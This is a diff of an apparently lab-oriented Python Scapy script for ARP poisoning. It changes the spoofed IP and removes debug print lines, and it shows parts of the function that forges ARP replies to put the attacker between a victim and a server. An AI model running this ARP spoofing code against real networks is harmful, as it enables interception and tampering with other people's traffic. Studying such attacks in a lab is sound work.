@@ -10,7 +10,7 @@ networkInterface = "enp0s3"
 victimIP = "192.168.56.101"
 victimMAC = "08:00:27:b0:a1:ab"
 
-spoofIP = "192.168.56.102"
+spoofIP = "192.168.56.104"
 serverMAC = "08:00:27:c6:a4:61"
 
 # input :
@@ -25,8 +25,6 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
         attackerMAC = get_if_hwaddr(networkInterface)
         victimMAC =[util.getMAC(ip, networkInterface) for ip in victimIP ]
         spoofMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP ]
-
-        print  (attackerMAC ,victimMAC, spoofMAC)
 
         #check if such IP adresses exist on network with given interface
         if spoofMAC==None or attackerMAC == None or victimMAC == None :
@@ -57,7 +55,6 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
                     pktS[ARP].pdst = spoofIP[j]
 
                     sendp(pktS, iface=networkInterface)
-        print("Poisoned")
 
-
+                    
 #arpPoisoning([victimIP], [spoofIP], networkInterface)
